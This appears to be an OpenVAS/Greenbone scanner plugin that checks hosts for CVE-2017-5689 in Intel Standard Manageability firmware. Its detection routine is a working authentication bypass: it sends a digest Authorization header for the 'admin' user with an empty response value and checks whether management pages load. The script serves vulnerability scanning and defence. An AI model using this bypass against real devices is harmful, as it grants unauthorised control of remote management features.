CPE = "cpe:/o:intel:standard_manageability_firmware";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.810997" );
	script_version( "2021-09-09T08:01:35+0000" );
	script_cve_id( "CVE-2017-5689" );
	script_bugtraq_id( 98269 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-09-09 08:01:35 +0000 (Thu, 09 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2020-02-18 17:12:00 +0000 (Tue, 18 Feb 2020)" );
	script_tag( name: "creation_date", value: "2017-05-05 15:39:37 +0530 (Fri, 05 May 2017)" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "Intel Standard Manageability Privilege Escalation Vulnerability" );
	script_tag( name: "summary", value: "This host is running Intel system with Intel
  Standard Manageability and is prone to privilege escalation vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check if we are able to access the manageability features of this product." );
	script_tag( name: "insight", value: "The flaw exists due to mishandling of input
  in an unknown function." );
	script_tag( name: "impact", value: "Successful exploitation will allow an
  unprivileged attacker to gain control of the manageability features provided
  by these products." );
	script_tag( name: "affected", value: "Intel Standard Manageability firmware
  versions 6.x before 6.2.61.3535, 7.x before 7.1.91.3272, 8.x before 8.1.71.3608,
  9.0.x and 9.1.x before 9.1.41.3024, 9.5.x before 9.5.61.3012, 10.x before 10.0.55.3000,
  11.0.x before 11.0.25.3001, 11.5.x and 11.6.x before 11.6.27.3264." );
	script_tag( name: "solution", value: "Upgrade to Intel Standard Manageability
  firmware versions 6.2.61.3535 or 7.1.91.3272 or 8.1.71.3608 or 9.1.41.3024 or
  9.5.61.3012 or 10.0.55.3000 or 11.0.25.3001 or 11.6.27.3264 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00075.html" );
	script_xref( name: "URL", value: "https://arstechnica.com/security/2017/05/intel-patches-remote-code-execution-bug-that-lurked-in-cpus-for-10-years" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_intel_standard_manageability_detect.sc" );
	script_mandatory_keys( "intel/ism/detected" );
	script_require_ports( "Services/www", 16992, 16993 );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/index.htm";
req = http_get_req( port: port, url: url );
res = http_keepalive_send_recv( port: port, data: req );
if(res && ContainsString( res, "Server: Intel(R) Standard Manageability" )){
	match = eregmatch( string: res, pattern: "\"Digest.(.*)\", nonce=\"(.*)\",stale" );
	if( match[1] && match[2] ){
		digest = match[1];
		nonce = match[2];
	}
	else {
		exit( 0 );
	}
	asp_session = NASLString( "Digest username=\"admin\", realm=\"Digest:", digest, "\", nonce=\"", nonce, "\", uri=\"/index.htm\", response=\"\", qop=auth, nc=00000001,
                        cnonce=\"cb199a22ab5646c7\"" );
	req = http_get_req( port: port, url: url, add_headers: make_array( "Authorization", asp_session ) );
	res = http_keepalive_send_recv( port: port, data: req );
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "Server: Intel(R) Standard Manageability" ) && ContainsString( res, ">Hardware Information" ) && ContainsString( res, ">IP address" ) && ContainsString( res, ">System ID" ) && ContainsString( res, ">System<" ) && ContainsString( res, ">Processor<" ) && ContainsString( res, ">Memory<" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

